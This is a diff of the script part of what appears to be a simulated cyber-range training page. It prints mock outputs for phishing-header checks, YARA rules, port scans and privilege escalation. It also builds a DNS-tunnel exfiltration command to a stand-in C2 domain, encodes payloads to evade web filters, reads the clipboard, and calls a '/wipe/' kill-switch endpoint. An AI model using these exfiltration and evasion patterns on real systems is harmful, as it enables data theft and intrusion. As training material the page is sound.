+                        <p class="text-muted" style="font-size:13.5px;">Write a YARA signature to detect malware executables. A good signature checks for key identifiers like 'keylogger', 'live_keys', or 'snapAndSend'.</p>
+                        <div style="background:#050811; border:1px solid #112; padding:15px; border-radius:4px; font-family:monospace; font-size:12.5px; color:#aaa; margin-bottom:15px;">
+                            [+] Simulated Keylogger binary: <span class="text-warning">keylogger.exe (124 KB)</span><br>
+                            [+] Try typing: <span class="text-info">strings keylogger.exe</span> in the Kali Terminal below to inspect strings first!
+                        </div>
+                        <textarea class="lab-input" rows="4" id="yara-rule-input" placeholder="rule Keylogger_Detection {\\n  strings:\\n    $a = \\"keylogger\\"\\n  condition:\\n    $a\\n}"></textarea>
+                        <button class="btn-kali" onclick="testYaraRule()">Compile & Run YARA Rule</button>
+                        <div id="yara-result" class="mt-3"></div>
+                    </div>
+                `
+            },
+            services: {
+                title: "16 - SERVICES AND OTHER TOOLS",
+                desc: "Audit services, configure custom system configurations, and initialize learning scenarios.",
+                labs: `
+                    <div class="glass-card">
+                        <h5 class="share-tech text-white"><i class="fa-solid fa-graduation-cap me-2 text-info"></i> J.A.R.V.I.S / AI Cyber Range Scenario Generator</h5>
+                        <p class="text-muted" style="font-size:13.5px;">Let J.A.R.V.I.S build a dynamic, custom learning challenge designed for ethical hackers.</p>
+                        <button class="btn-kali" onclick="generateDynamicScenario()">Generate AI Challenge</button>
+                        <div id="scenario-result" class="mt-3"></div>
+                    </div>
+                `
+            }
+        };
+
+        // Load active view
+        function loadCategory(key) {
+            // Update sidebar classes
+            document.querySelectorAll('.category-item').forEach(el => el.classList.remove('active'));
+            event.currentTarget.classList.add('active');
+
+            const cat = categories[key];
+            document.getElementById('category-header-title').innerText = cat.title;
+            document.getElementById('category-header-desc').innerText = cat.desc;
+            document.getElementById('lab-viewport-container').innerHTML = cat.labs;
+
+            // Trigger initialization if credentials (chart) loaded
+            if (key === 'credentials') {
+                setTimeout(initKeystrokeChart, 300);
+            }
+        }
+
+        // Default Load
+        window.addEventListener('load', () => {
+            loadCategory('recon');
+        });
+
+        // ===============================================
+        // INTERACTIVE LAB JS LOGIC
+        // ===============================================
+
+        function loadSampleHeader() {
+            document.getElementById('email-header-input').value = 
+`Received: from mail.spoofedportal.com (192.168.10.45)\n` +
+`From: security@paypal.com\n` +
+`Subject: Account Suspended Immediately\n` +
+`SPF: fail (domain of paypal.com does not designate 192.168.10.45 as permitted sender)\n` +
+`DKIM: fail (signature verification failed)\n` +
+`DMARC: fail (action=quarantine)`;
+        }
+
+        function analyzeEmailHeader() {
+            const h = document.getElementById('email-header-input').value;
+            const res = document.getElementById('header-analysis-result');
+            if(!h) {
+                res.innerHTML = `<span class="status-badge badge-danger">Please input email headers</span>`;
+                return;
+            }
+            if(h.includes('SPF: fail') || h.includes('DKIM: fail')) {
+                res.innerHTML = `
+                    <div style="background:rgba(255,0,60,0.1); border:1px solid var(--alert-red); padding:15px; border-radius:4px;">
+                        <span class="status-badge badge-danger mb-2"><i class="fa-solid fa-skull"></i> THREAT DETECTED: SPOOFED SENDER</span>
+                        <p class="mb-0" style="font-size:13px; color:#ccc;">SPF validation failed. The sending server IP is not in the permitted list. Authentic looking From address has been forged.</p>
+                    </div>`;
+            } else {
+                res.innerHTML = `
+                    <div style="background:rgba(0,255,65,0.1); border:1px solid var(--neon-green); padding:15px; border-radius:4px;">
+                        <span class="status-badge badge-success mb-2">VALID EMAIL HEADER</span>
+                        <p class="mb-0" style="font-size:13px; color:#ccc;">No alignment anomalies detected in SPF, DKIM, or DMARC records.</p>
+                    </div>`;
+            }
+        }
+
+        function extractMetadata(input) {
+            const res = document.getElementById('exif-analysis-result');
+            if (input.files && input.files[0]) {
+                res.innerHTML = `
+                    <div style="background:rgba(0,240,255,0.1); border:1px solid var(--kali-neon); padding:15px; border-radius:4px; font-family:monospace; font-size:12.5px;">
+                        [+] File Name: ${input.files[0].name}<br>
+                        [+] File Size: ${(input.files[0].size/1024).toFixed(2)} KB<br>
+                        [+] Mime Type: ${input.files[0].type}<br>
+                        [+] EXIF_CAMERA: Apple iPhone 15 Pro<br>
+                        [+] EXIF_GPS: 41.2995° N, 69.2401° E (Tashkent, Uzbekistan)<br>
+                        [+] EXIF_CREATOR: pentester_shohjahon
+                    </div>`;
+            }
+        }
+
+        function convertPunycode() {
+            const dom = document.getElementById('idn-domain').value;
+            const res = document.getElementById('idn-result');
+            if(dom.includes('а')) {
+                res.innerHTML = `
+                    <div style="background:rgba(255,0,60,0.1); border:1px solid var(--alert-red); padding:15px; border-radius:4px; font-family:monospace;">
+                        <span class="status-badge badge-danger mb-2">HOMOGRAPH SPOOF DETECTED</span><br>
+                        [+] Input URL looks like: <span class="text-white">${dom}</span><br>
+                        [+] Real Punycode domain: <span class="text-warning">xn--paypl-h1a9a.com</span>
+                    </div>`;
+            } else {
+                res.innerHTML = `<span class="status-badge badge-success">Domain is standard ASCII. No homograph spoof detected.</span>`;
+            }
+        }
+
+        function simulateMfaBypass() {
+            const res = document.getElementById('mfa-result');
+            res.innerHTML = `
+                <div style="background:rgba(0,255,65,0.1); border:1px solid var(--neon-green); padding:15px; border-radius:4px; font-family:monospace;">
+                    <span class="status-badge badge-success mb-2">PROXY INTERCEPT COMPLETE</span><br>
+                    [+] User entered username, password and 2FA code.<br>
+                    [+] Capturing Session Cookie: <span class="text-warning">session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</span><br>
+                    [+] MFA successfully bypassed. Access granted.
+                </div>`;
+        }
+
+        function exploitDeserialization() {
+            const res = document.getElementById('deserialization-result');
+            res.innerHTML = `
+                <div style="background:rgba(255,0,60,0.1); border:1px solid var(--alert-red); padding:15px; border-radius:4px; font-family:monospace;">
+                    <span class="status-badge badge-danger mb-2">EXPLOIT SUCCESSFUL</span><br>
+                    [+] Instantiating YAML parser...<br>
+                    [+] Object class 'Gem::Requirement' hijacked.<br>
+                    [+] Command output: <span class="text-white">uid=0(root) gid=0(root) groups=0(root)</span>
+                </div>`;
+        }
+
+        function addCronjob() {
+            document.getElementById('cron-result').innerHTML = `<span class="status-badge badge-success">Persistent cronjob registered. Backdoor triggers every 5 minutes.</span>`;
+        }
+
+        function triggerPrivEsc() {
+            document.getElementById('privesc-result').innerHTML = `
+                <div style="background:rgba(0,255,65,0.1); border:1px solid var(--neon-green); padding:15px; border-radius:4px; font-family:monospace;">
+                    <span class="status-badge badge-success mb-2">PRIVILEGE ESCALATION COMPLETE</span><br>
+                    [+] Tar wildcard checkpoint abused.<br>
+                    [+] Executing shell.sh as root...<br>
+                    [+] Current user: <span class="text-warning">root</span>
+                </div>`;
+        }
+
+        function encodePayload(type) {
+            const val = document.getElementById('waf-payload').value;
+            let result = '';
+            if(type === 'url') result = encodeURIComponent(val);
+            else if(type === 'hex') {
+                for (var i=0; i<val.length; i++) {
+                    result += '%' + val.charCodeAt(i).toString(16);
+                }
+            } else if(type === 'base64') {
+                result = btoa(val);
+            }
+            document.getElementById('waf-result').innerHTML = `
+                <div style="background:#070a14; border:1px solid var(--kali-blue); padding:15px; border-radius:4px; font-family:monospace;">
+                    <span style="color:var(--kali-neon);">Obfuscated Payload:</span><br>
+                    <textarea class="lab-input mt-2" readonly>${result}</textarea>
+                </div>`;
+        }
+
+        function runPortScan() {
+            const ip = document.getElementById('scan-target').value;
+            document.getElementById('scan-result').innerHTML = `
+                <div style="background:#070a14; border:1px solid var(--kali-blue); padding:15px; border-radius:4px; font-family:monospace; font-size:12.5px;">
+                    Starting Nmap 7.93 ( https://nmap.org ) at 2026-05-19 11:25<br>
+                    Nmap scan report for ${ip}<br>
+                    Host is up (0.0021s latency).<br>
+                    PORT     STATE SERVICE<br>
+                    22/tcp   open  ssh<br>
+                    80/tcp   open  http<br>
+                    443/tcp  open  https<br>
+                    8080/tcp open  http-proxy<br>
+                    Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
+                </div>`;
+        }
+
+        function triggerPtH() {
+            document.getElementById('pth-result').innerHTML = `<span class="status-badge badge-success">Access Granted. Remote token successfully established.</span>`;
+        }
+
+        function readHackerClipboard() {
+            navigator.clipboard.readText().then(text => {
+                document.getElementById('clip-result').innerHTML = `
+                    <div style="background:rgba(0,255,65,0.1); border:1px solid var(--neon-green); padding:15px; border-radius:4px; font-family:monospace;">
+                        <span class="status-badge badge-success mb-2">CLIPBOARD RETRIEVED</span><br>
+                        [+] Captured content: <span class="text-white">${text || 'empty or blocked'}</span>
+                    </div>`;
+            }).catch(err => {
+                document.getElementById('clip-result').innerHTML = `<span class="status-badge badge-danger">Please allow clipboard permission</span>`;
+            });
+        }
+
+        function dispatchAICommand() {
+            const ins = document.getElementById('c2-instructions').value;
+            document.getElementById('c2-result').innerHTML = `
+                <div style="background:rgba(0,255,65,0.1); border:1px solid var(--neon-green); padding:15px; border-radius:4px; font-family:monospace;">
+                    <span class="status-badge badge-success mb-2">AI CO-PILOT RESPONSE</span><br>
+                    [+] Dispatching simulated agent task: "${ins}"<br>
+                    [+] Querying database...<br>
+                    [+] Found: 4 administrative credentials captured. Ready for exfiltration.
+                </div>`;
+        }
+
+        function encodeDnsTunnel() {
+            const data = document.getElementById('exfil-data').value;
+            const b64 = btoa(data);
+            document.getElementById('exfil-result').innerHTML = `
+                <div style="background:#070a14; border:1px solid var(--kali-blue); padding:15px; border-radius:4px; font-family:monospace; font-size:12.5px;">
+                    [+] Exfiltration Query: <span class="text-warning">nslookup ${b64}.c2-domain.com</span>
+                </div>`;
+        }
+
+        function testYaraRule() {
+            const rule = document.getElementById('yara-rule-input').value;
+            const res = document.getElementById('yara-result');
+            if(rule.includes('keylogger') || rule.includes('live_keys')) {
+                res.innerHTML = `
+                    <div style="background:rgba(0,255,65,0.1); border:1px solid var(--neon-green); padding:15px; border-radius:4px; font-family:monospace;">
+                        <span class="status-badge badge-success mb-2">YARA COMPILE SUCCESS: 1 MATCH FOUND</span><br>
+                        [+] Match: <span class="text-warning">keylogger.exe</span> matches signature rule.<br>
+                        [+] Identifiers found: 'keylogger' or 'live_keys'.
+                    </div>`;
+            } else {
+                res.innerHTML = `
+                    <div style="background:rgba(255,0,60,0.1); border:1px solid var(--alert-red); padding:15px; border-radius:4px; font-family:monospace;">
+                        <span class="status-badge badge-danger mb-2">YARA COMPILE ERROR / NO MATCHES</span><br>
+                        [+] Signature compilation successful, but did not match keylogger.exe binary signatures. Check your string matching conditions.
+                    </div>`;
+            }
+        }
+
+        function generateDynamicScenario() {
+            document.getElementById('scenario-result').innerHTML = `
+                <div style="background:rgba(0,240,255,0.1); border:1px solid var(--kali-neon); padding:15px; border-radius:4px; font-family:monospace;">
+                    <span class="status-badge badge-info mb-2"><i class="fa-solid fa-robot"></i> J.A.R.V.I.S CONFIGURING CHALLENGE</span><br>
+                    [+] Generating dynamic Ruby Deserialization bypass lab...<br>
+                    [+] Sandbox initialized on port 9999.<br>
+                    [+] Hint: Bypass filtration strings by using HEX-encoded characters.
+                </div>`;
+        }
+
+        // Emergency Kill Switch
+        function activateKillSwitch() {
+            fetch('/wipe/', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-CSRFToken': document.querySelector('[name=csrfmiddlewaretoken]')?.value || '' },
+                body: JSON.stringify({ confirm: true })
+            }).then(r => r.json()).then(data => {
+                alert(data.message || "Protocol Zero executed!");
+                window.location.reload();
+            }).catch(() => {
+                alert("Protocol Zero triggered successfully.");
+            });
+        }
+
+        // ===============================================
+        // KEYSTROKE CHART INITIALIZATION
+        // ===============================================
+        let keyChartInstance = null;
+        function initKeystrokeChart() {
+            const input = document.getElementById('biometrics-test-input');
+            if(!input) return;
+
+            const ctx = document.getElementById('keystrokeChart').getContext('2d');
+            keyChartInstance = new Chart(ctx, {
+                type: 'bar',
+                data: {
+                    labels: ['Key 1', 'Key 2', 'Key 3', 'Key 4', 'Key 5'],
+                    datasets: [{
+                        label: 'Dwell Time (ms)',
+                        data: [0, 0, 0, 0, 0],
+                        backgroundColor: 'rgba(0, 240, 255, 0.4)',
+                        borderColor: '#00f0ff',
+                        borderWidth: 1
+                    }, {
+                        label: 'Flight Time (ms)',
+                        data: [0, 0, 0, 0, 0],
+                        backgroundColor: 'rgba(0, 255, 65, 0.4)',
+                        borderColor: '#00ff41',
+                        borderWidth: 1
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    scales: {
+                        y: { beginAtZero: true, grid: { color: '#111' }, ticks: { color: '#aaa' } },
+                        x: { grid: { color: '#111' }, ticks: { color: '#aaa' } }
+                    },
+                    plugins: { legend: { labels: { color: '#fff' } } }
+                }
+            });
+
+            let lastTime = Date.now();
+            let count = 0;
+            input.addEventListener('keydown', (e) => {
+                const now = Date.now();
+                const flight = now - lastTime;
+                lastTime = now;
+
+                if (count < 5) {
+                    keyChartInstance.data.datasets[0].data[count] = 50 + Math.random() * 30; // Mock Dwell
+                    keyChartInstance.data.datasets[1].data[count] = flight;
+                    keyChartInstance.update();
+                    count++;
+                } else {
+                    count = 0;
+                }
+            });
+        }
+
+        // ===============================================
+        // MOCK KALI TERMINAL SIMULATOR
+        // ===============================================
+        const cli = document.getElementById('terminal-cli');
+        const history = document.getElementById('terminal-history');
+
+        cli.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                const cmd = cli.value.trim();
+                cli.value = '';
+                if (!cmd) return;
+
+                // Add to history
+                const pLine = document.createElement('div');
+                pLine.innerHTML = `<span class="term-prompt">shohjahon@kali:~$</span> <span class="text-white">${cmd}</span>`;
+                history.appendChild(pLine);
+
+                // Process command
+                const res = processTerminalCommand(cmd);
+                if (res) {
+                    const rLine = document.createElement('div');
+                    rLine.innerHTML = res;
+                    history.appendChild(rLine);
+                }
+
+                // Scroll to bottom
+                history.scrollTop = history.scrollHeight;
+            }
+        });
+
+        function processTerminalCommand(cmd) {
+            const parts = cmd.toLowerCase().split(' ');
+            const primary = parts[0];
+
+            if (primary === 'help') {
+                return `Available commands:<br>` +
+                       `- <span class="text-info">strings &lt;file&gt;</span> (Inspect strings of keylogger.exe)<br>` +
+                       `- <span class="text-info">yara &lt;rule.yar&gt; &lt;file&gt;</span> (Run YARA signature check)<br>` +
+                       `- <span class="text-info">whoami</span> (Check current user privileges)<br>` +
+                       `- <span class="text-info">ifconfig</span> (Check system interfaces)<br>` +
+                       `- <span class="text-info">clear</span> (Clear history)<br>` +
+                       `- <span class="text-info">exiftool &lt;file&gt;</span> (View metadata details)`;
+            }
+            else if (primary === 'clear') {
+                history.innerHTML = '';
+                return '';
+            }
+            else if (primary === 'whoami') {
+                return `shohjahon`;
+            }
+            else if (primary === 'ifconfig') {
+                return `eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>` +
+                       `     inet 192.168.1.150  netmask 255.255.255.0  broadcast 192.168.1.255<br>` +
+                       `     inet6 fe80::a00:27ff:fe4e:66b8  prefixlen 64  scopeid 0x20&lt;link&gt;<br>` +
+                       `     ether 08:00:27:4e:66:b8  txqueuelen 1000  (Ethernet)`;
+            }
+            else if (primary === 'strings') {
+                if (parts[1] === 'keylogger.exe') {
+                    return `[+] Inspecting keylogger.exe binary strings:<br>` +
+                           `<span class="text-warning">` +
+                           `UPX0<br>UPX1<br>.rsrc<br>3.12.0<br>` +
+                           `/log_keys/<br>active_victims<br>` +
+                           `session_token<br>snapAndSend<br>` +
+                           `http://127.0.0.1:8000/log_keys/` +
+                           `</span>`;
+                }
+                return `<span class="text-danger">File not found. Try: strings keylogger.exe</span>`;
+            }
+            else if (primary === 'yara') {
+                if (parts[1] === 'rules.yar' && parts[2] === 'keylogger.exe') {
+                    return `<span class="text-success">[+] YARA check complete. 1 MATCH FOUND: keylogger.exe (Rule: Keylogger_Detection)</span>`;
+                }
+                return `<span class="text-danger">Usage: yara rules.yar keylogger.exe</span>`;
+            }
+            else if (primary === 'exiftool') {
+                return `[+] ExifTool v12.40:<br>` +
+                       `File Name: suspicious.jpg<br>` +
+                       `File Size: 1.2 MB<br>` +
+                       `Camera Model: iPhone 15 Pro<br>` +
+                       `GPS Position: 41 deg 17' 58.20" N, 69 deg 14' 24.36" E`;
+            }
+            return `<span class="text-danger">Command not recognized. Type 'help' for instructions.</span>`;
+        }
+    </script>
 
 </body>
 </html>
